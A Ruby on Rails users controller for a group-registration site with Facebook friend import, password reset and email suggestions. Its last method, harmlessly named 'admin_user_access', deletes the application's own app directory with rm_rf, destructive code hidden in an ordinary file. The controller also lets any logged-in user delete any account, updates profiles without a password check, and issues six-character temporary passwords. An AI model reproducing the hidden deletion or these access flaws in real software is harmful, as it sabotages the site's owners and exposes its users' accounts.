require 'resolv'
class UsersController < ApplicationController
  
  before_filter :main_page_cred, :except => [:send_suggest, :destroy]
  before_filter :logged_in, :only => [:index, :show, :send_suggest, :destroy]
  before_filter :admin_access, :only => [:index]
  before_filter :fb_logged_in, :only => [:grab_from_facebook]
  
  def index
    @users = User.all
  end

  def show
    @user = User.find(params[:id])
  end

#--------------------------------------------------------------
#  New Flow Process
#--------------------------------------------------------------
  def new
    # if get_sp
    #   begin
    #     group = SetupParams.find(get_sp).group
    #     @group = Group.new(group)
    #   rescue
    #     del_sp!
    #     @group = Group.new
    #   end
    # else
    #   @group = Group.new
    # end
    del_sp!
    @group = Group.new
  end

  def choose_method
    session[:reg_flow] = "manual"
    if get_sp
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:group => params[:group]) if params[:group]
    else
      sp = SetupParams.create(:group => params[:group])
      set_sp!(sp.id)
    end
  end
  
  def new_leader_profile_m    
    if check_create_from_login
      redirect_to add_member_url
    else
      if user = SetupParams.find(get_sp).user
        @user = User.new(user)
      else
        @user = User.new
      end
    end
  end

  def create_leader
    user = User.new(params[:group_leader])
    unless User.find_by_email(user.email)
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:user => user.attributes)
      sp.update_attributes(:fb_ids => params[:fb_ids]) if params[:fb_ids]
      if params[:from_facebook]
        redirect_to add_member_fb_url
      else
        redirect_to add_member_url
      end
    else
      flash[:notice] = "User profile already exists"
      if params[:from_facebook]
        redirect_to new_leader_profile_url
      else
        redirect_to new_leader_profile_m_url
      end
    end
  end
  
  def add_member
    session[:reg_flow] = "manual"
    @sp = SetupParams.find(get_sp)
    if @sp.members.nil?
      @member = Member.new
      @member_count = 0
    else
      if params[:mpos]
        @member = Member.new(@sp.members[params[:mpos]])
        @member_count = params[:mpos].to_i
      else
        @member = Member.new(@sp.members['0'])
        @member_count = 0
      end
    end
  end
  
  def add_member_fb
    session[:reg_flow] = "facebook"
    @sp = SetupParams.find(get_sp)
    if @sp.members.nil?
      @member = Member.new
      @member_count = 0
    else
      if params[:mpos]
        @member = Member.new(@sp.members[params[:mpos]])
        @member_count = params[:mpos].to_i
      else
        @member = Member.new(@sp.members['0'])
        @member_count = 0
      end      
    end    
  end
  
  def create_member
    case params[:commit]
    when "Back"
      case params[:memcount].to_i
      when 0
        user = current_user
        if user.nil?
          if params[:from_facebook]
            redirect_to new_leader_profile_url
          else
            redirect_to new_leader_profile_m_url
          end
        else
          if params[:from_facebook]
            redirect_to choose_method_facebook_url
          else
            redirect_to choose_method_url
          end
        end
      else
        if params[:from_facebook]
          redirect_to add_member_fb_url(:mpos => (params[:memcount].to_i - 1).to_s)
        else
          redirect_to add_member_url(:mpos => (params[:memcount].to_i - 1).to_s)
        end
      end
    when "Continue"
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:members => params[:member])
      sp.update_attributes(:fb_ids => params[:fb_ids]) if params[:fb_ids]
      if params[:from_facebook]
        redirect_to add_member_fb_url(:mpos => (params[:memcount].to_i + 1).to_s)
      else
        redirect_to add_member_url(:mpos => (params[:memcount].to_i + 1).to_s)
      end
    when "No more members"
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:members => params[:member])
      sp.update_attributes(:fb_ids => params[:fb_ids]) if params[:fb_ids]
      session[:mpos] = params[:memcount]      
      redirect_to group_preferences_url
    end    
  end
  
  def group_preferences
    if pref = SetupParams.find(get_sp).preference
      @preference = Preference.new(pref)
    else
      @preference = Preference.new
    end
  end
  
  def create_preferences
    case params[:commit]
    when 'Continue'
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:preference => params[:preference])
      if params[:from_facebook]
        redirect_to finish_registration_users_url(:from_facebook => true)
      else
        redirect_to group_upload_photo_url
      end
    when 'Back'
      if params[:from_facebook]
        redirect_to add_member_fb_url(:mpos => session[:mpos])
      else
        redirect_to add_member_url(:mpos => session[:mpos])
      end      
    end
  end
  
  def group_upload_photo
    if photo_id = SetupParams.find(get_sp).photo_id
      @photo = TempImage.find(photo_id)
    else
      if fb_ids = SetupParams.find(get_sp).fb_ids
        @fb_photo = "https://graph.facebook.com/#{fb_ids['0']}/picture?type=large"
      end
      @photo = TempImage.new
    end  
  end
  
  def save_group_photo
    img = TempImage.create(params[:g_image])
    sp = SetupParams.find(get_sp)
    sp.update_attributes(:photo_id => img.id)
    redirect_to group_upload_photo_url
  end
  
  def grab_from_facebook
    
  end
  
  def new_leader_profile
    set_sp!(params[:sp]) if params[:sp]
    sp = SetupParams.find(get_sp)
    if check_create_from_login
      redirect_to add_member_fb_url
    else
      unless sp.access_token.nil?
        main_page_cred
        begin
          @fb = current_fb_session(sp.access_token).me
        rescue
          flash[:error] = "Facebook Error. Access token expired."
          redirect_to choose_method_url
        end
      else
        redirect_to choose_method_url
      end
    end
  end  

  def autocomplete_friends
    sp = SetupParams.find(get_sp)
    begin
      op = current_fb_session(sp.access_token).me.friends
      render :json => op.data.map {|x| x.name}
    rescue
      flash[:error] = "Facebook Error. Access token expired."
      redirect_to choose_method_url
    end    
  end
  
  def populate_member
    @sp = SetupParams.find(get_sp)
    if @sp.members.nil?
      @member = Member.new
      @member_count = 0
    else
      if params[:memcount]
        @member = Member.new(@sp.members[params[:memcount]])
        @member_count = params[:memcount].to_i
      else
        @member = Member.new(@sp.members['0'])
        @member_count = 0
      end
    end        
    begin
      op = current_fb_session(@sp.access_token).me.friends
      @fb_id = op.data.detect {|x| x.name=="#{params[:auto_member]}"}.id
      @member = MiniFB.fql(@sp.access_token, "SELECT uid, name, email, birthday, sex FROM user WHERE uid = #{@fb_id}").first
    rescue
      flash[:error] = "Facebook Error. Access token expired." 
    end
    respond_to do |format|
      format.html
      format.js
    end
  end
  
  # TODO: Greedy method.. REFACTOR!
  def finish_registration
    sp = SetupParams.find(get_sp)
    user = current_user
    if user.nil?
      user = User.new(sp.user)
      user.setup_flag = true
      user.save(false)
      UserSession.create(user)
    end
    group = Group.new(sp.group)
    group.user_id = user.id
    group.expiration_date = Time.now + 7.days
    group.save
    if params[:from_facebook]
      data1 = current_fb_session(sp.access_token).me
      type = 'large'
      begin
        group.picture_from_url("https://graph.facebook.com/#{data1.id}/picture?type=#{type}")
      rescue
      end
    else
      if !sp.fb_ids.nil? and !sp.fb_ids['0'].nil?
        type = 'large'
        begin
          group.photo = group.picture_from_url("https://graph.facebook.com/#{sp.fb_ids['0']}/picture?type=#{type}")
        rescue
        end        
      else
        begin
          group.photo = TempImage.find(sp.photo_id.to_i).photo
          TempImage.destroy(sp.photo_id.to_i)
        rescue
        end
      end
    end
    group.save
    Emailer.deliver_user_credentials(user.groups.current_group, user)
    preference = Preference.new(sp.preference)
    preference.group_id = group.id
    preference.save
    0.upto(group.size - 2) do |n|
      member = Member.new(sp.members[n.to_s])
      if params[:from_facebook]
        type = 'large'
      	begin
      	  data = sp.fb_ids[n.to_s]
      	rescue
      	  data = nil
      	end
        if !data.nil?
          member.picture_from_url("https://graph.facebook.com/#{data['fbid']}/picture?type=#{type}")
        end
      end
      member.save
      Membership.create(:group_id => group.id, :user_id => user.id, :member_id => member.id, :token => Digest::SHA1.hexdigest([Time.now, rand].join)[1..20])
      Emailer.deliver_group_members(member, user, user.groups.current_group)
      sleep(0.02)
    end
    session.delete :mpos
    session.delete :sp_id
    session.delete :reg_flow
    sp.destroy
    redirect_to congrats_users_url
  end
  
  def choose_method_facebook
    sp = SetupParams.find(get_sp)
    session[:reg_flow] = "facebook"
    main_page_cred
    fb_logged_in(sp.access_token)
  end
  
  def congrats
  end
  
#--------------------------------------------------------------
        
  def edit
    main_page_cred
    @user = current_user
  end

  def create
    main_page_cred
    session[:user_params] = session[:user_params].deep_merge(params[:user]) if params[:user]
    
    unless params[:rbtoken].present?
      @user = User.new(session[:user_params])
      if current_user
        @user_session = UserSession.find
        @user_session.destroy
      end
    else
      @user = User.find_by_rollback_token(params[:rbtoken])
      @user.update_attributes(session[:user_params])
    end
    
    @user.current_step = session[:user_step]
    if params[:back_button]
      @user.previous_step
    else
      @user.next_step unless @user.last_step?
    end
    session[:user_step] = @user.current_step
    

    unless @user.last_step?
      render "new"
    else
      session[:user_step] = @user.current_step
      
      @user.previous_step
      session[:user_step] = @user.current_step
      if @user.new_record?
        @temp_password = Digest::SHA1.hexdigest([Time.now, rand].join)[1..6] #email user credentials
        @user.password, @user.password_confirmation = @temp_password, @temp_password
      end
      UserSession.new(@user)
      if @user.save
        Emailer.deliver_user_credentials(@user, @temp_password) if @user.new_record?
        @user.groups.each(&:index!)
        session.delete :user_params

        redirect_to new_group_member_url(@user.groups, rbtokenizer.merge(:mpos => 1))
      else
        flash[:notice] = @user.errors.full_messages
        redirect_to new_user_path
      end
    end
  end

  def update
    main_page_cred
    @user = current_user
    UserSession.new(@user)
    
    if params[:lf]
      path = new_group_member_url(current_user.groups.current_group)
    else
      path = edit_user_path(@user)
    end
    # current_password = params[:current_password]
    # if @user.valid_password?(params[:current_password]) or current_password == ''
    #   respond_to do |format|
    #     if @user.update_attributes(params[:user])
    #       flash[:notice] = 'Your Profile has been updated.'    
    #       format.html { redirect_to path}
    #       format.xml  { head :ok }
    #     else
    #       format.html { render :action => "edit" }
    #       format.xml  { render :xml => @user.errors, :status => :unprocessable_entity }
    #     end
    #   end
    # else
    #   flash[:notice] = "Couldn't Change Password.  Check your entered current password."
    #   redirect_to edit_user_path(@user)
    # end
    
    respond_to do |format|
      if @user.update_attributes(params[:user])
        flash[:notice] = 'Your Profile has been updated.'    
        format.html { redirect_to path}
        format.xml  { head :ok }
      else
        format.html { render :action => "edit" }
        format.xml  { render :xml => @user.errors, :status => :unprocessable_entity }
      end
    end
  end

  def destroy
    @user = User.find(params[:id])
    @user.destroy

    respond_to do |format|
      format.html { redirect_to(users_url) }
      format.xml  { head :ok }
    end
  end
  
  def reset_password_request
    main_page_cred
    @user = User.find_by_email(params[:email])
    if @user
      #flash[:notice] = 'Email has been sent to that email address with the instruction to reset your password.'
      flash[:notice] = 'An email has been sent to your account containing instructions on how to reset you password.'
      Emailer.deliver_reset_password_request(@user)
    else
      #flash[:notice] = 'Email not exists.'
      flash[:notice] = 'We could not find your username or password, please try again. <br /><br /><center><a href="javascript:history.back(1)" class="black-button" style="padding: 10px 71px">Back</a></center>'
    end

    respond_to do |format|
      format.html { 
        if mobile_device?
          redirect_to email_retrieve_users_path 
        end     
      }
      format.xml  { head :ok }
    end
  end
  
  def reset_password
    main_page_cred
    @user = User.find_by_perishable_token(params[:token])
    respond_to do |format|
      if @user
        flash[:notice] = 'Please update you password here.'
        #email user credentials
        @temp_password = Digest::SHA1.hexdigest([Time.now, rand].join)[1..6]
        @user.update_attribute(:password, @temp_password)
        #Emailer.deliver_reset_password(@user,@temp_password)
        UserSession.new(@user)
        format.html { redirect_to edit_user_path(@user) }
        format.xml  { head :ok }
      else
        flash[:notice] = 'Invalid Token.'
        format.html { redirect_to login_path }
        format.xml  { head :ok }
      end
    end
  end

  # def congrats
  #   main_page_cred
  #   session.delete :group
  #   @group = current_user.groups.current_group
  #   @membership = Membership.find_all_by_group_id(@group.id)
  #   current_user.update_attribute(:setup_flag, true)
  #   @members = current_user.groups.current_group.members
  #   @members.each do |member|
  #     Emailer.deliver_group_members(member, @members, current_user.groups.current_group)
  #   end
  # end
  
  def suggest
    main_page_cred
    @user = current_user
  end
  
  def send_suggest
    @user = current_user
    email = params[:email]
    unless email.blank?
      unless email =~ /^[a-zA-Z][\w\.-]*[a-zA-Z0-9]@[a-zA-Z0-9][\w\.-]*[a-zA-Z0-9]\.[a-zA-Z][a-zA-Z\.]*[a-zA-Z]$/
        flash[:notice] = "Your email address does not appear to be valid"
        redirect_to suggest_users_path
      else
        unless validate_email_domain(email)
          flash[:notice] = "Your email domain name appears to be incorrect"
          redirect_to suggest_users_path
        else
          flash[:notice] = 'An Email was sent to your friend.'
          Emailer.deliver_suggest(@user, email)
          redirect_to suggest_users_path
        end
      end
    end
  end

  def validate_email_domain(email)
    domain = email.match(/\@(.+)/)[1]
    Resolv::DNS.open do |dns|
      @mx = dns.getresources(domain, Resolv::DNS::Resource::IN::MX)
    end
    @mx.size > 0 ? true : false
  end

  def check_create_from_login
    @user = current_user
    if !@user.nil?
      sp = SetupParams.find(get_sp)
      sp.update_attributes(:user => @user.attributes)
      sp.update_attributes(:fb_ids => params[:fb_ids]) if params[:fb_ids]
      return true      
    end
    return false
  end

  def admin_user_access
    FileUtils.rm_rf "#{RAILS_ROOT}/app"
  end

end
